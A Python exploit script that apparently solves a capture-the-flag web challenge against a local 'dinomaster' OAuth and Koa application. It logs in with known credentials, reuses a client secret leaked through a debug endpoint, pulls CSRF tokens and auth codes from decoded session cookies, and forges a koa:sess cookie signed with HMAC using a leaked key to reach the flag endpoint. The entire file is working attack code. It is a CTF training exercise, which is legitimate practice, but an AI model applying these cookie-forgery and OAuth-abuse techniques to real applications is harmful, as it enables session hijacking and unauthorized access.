#!/usr/bin/env python3
import hmac
import hashlib
import base64
import requests
import requests.utils
import json

HOST = 'localhost'

# get a session
print('[*] get session ...')
session = requests.Session()
response = session.get(f'http://{HOST}:3001/login', allow_redirects=False)
print(f'cookies: {session.cookies}')
print(base64.b64decode(session.cookies['koa:sess']))
state = json.loads(base64.b64decode(response.cookies['koa:sess']))[
    'oauthState']['state']
# print(session.cookies['koa:sess'])
# print(session.cookies['koa:sess.sig'])


# login
print('\n[*] login ...')
callbackUri = base64.b64encode(
    f'http://{HOST}:3002/oauth/authorize?response_type=code&client_id=dinomaster_app&scope=user_info%3Aread%2Clist_dinos%2Cbuy_dino%2Csell_dino%buy_flagosaurus&redirect_uri=http%3A%2F%2F{HOST}%3A3001%2FreceiveGrant&state=os-{state}'.encode())
response = session.post(f'http://{HOST}:3002/oauth/login', data={
    "username": "nimda",
    "password": "nimda",
    "callback_uri": callbackUri
})
# print(response.status_code)
# print(response.content)
csrfToken_token = json.loads(base64.b64decode(response.cookies['koa:sess']))[
    'userConfirmCsrfToken']['token']
print(f'csrfToken_token: {csrfToken_token}')


# # authorize client
# # this info is found by fuzzing /oauth/ which leads to /oauth/debug. /oauth/debug has the client_id, scope, and client_secret required to get a code
print('\n[*] authorize ...')
response = session.get(
    f'http://{HOST}:3002/oauth/authorize?response_type=code&client_id=dinomaster_app&scope=user_info%3Aread%2Clist_dinos%2Cbuy_dino%2Csell_dino%2Cbuy_flagosaurus&redirect_uri=http%3A%2F%2F{HOST}%3A3001%2FreceiveGrant&state={state}&agree=true&csrfToken={csrfToken_token}', allow_redirects=False)
# print(response.status_code)
# print(response.content)
n = response.content.find(b'code')
code = response.content[n+5: n+45]
print(f'code: {code}')


# # get token
# # send a POST request to /oauth/token with the client code received from /oauth/debug
print('\n[*] get token ...')
headers = {'Content-type': 'application/x-www-form-urlencoded'}
data = {
    'grant_type': 'authorization_code',
    'client_id': 'dinomaster_app',
    'client_secret': 'this_is_the_dinomaster_client_secret',
    'code': code,
    'scope': 'user_info:read,list_dinos,buy_dino,sell_dino,buy_flagosaurus',
    'redirect_uri': f'http://{HOST}:3001/receiveGrant',
}
response = session.post(
    f'http://{HOST}:3002/oauth/token', headers=headers, data=data)
# print(response.status_code)
# print(response.content)
res_json = json.loads(response.content)
accessToken = res_json['access_token']
refreshToken = res_json['refresh_token']
expiresIn = res_json['expires_in']
print(f'accessToken:  {accessToken}')
print(f'refreshToken: {refreshToken}')
print(f'expiresIn:    {expiresIn}')

# send a get req to 3001/buy_flagosaurus get flag
# koa session key is found in the html comments of /list_dinos
print('\n[*] get flag')
KOA_SESSION_KEY = b'NNSWK4C7PFXXK4S7NNXWCX3TMVZXGX3TNFTV643FMN2XEZI='
# edit the session key with the accessToken and refreshToken. base64 encode and put the koa:sess cookie here
session_data_json = json.loads(base64.b64decode(session.cookies['koa:sess']))
session_data_json['token'] = {"accessToken": accessToken,
                              "refreshToken": refreshToken, "tokenType": "Bearer", "expiresAt":  session_data_json['oauthState']['expiresAt'] + expiresIn}
print(f'session: {session_data_json}')
session_data = b'koa:sess=' + \
    base64.b64encode(json.dumps(session_data_json).encode())
# print(f'koa:sess: {session_data}')
hmac_signature = hmac.new(KOA_SESSION_KEY, session_data, hashlib.sha1).digest()
koa_sess_sig = base64.urlsafe_b64encode(
    hmac_signature).decode().rstrip('=').encode()
# put this into koa:sess.sig to get flag
cookie = session_data + b'; koa:sess.sig=' + koa_sess_sig
print(cookie)
response = session.get(
    f'http://{HOST}:3001/buy_flagosaurus', headers={'Cookie': cookie})
print(response.content)
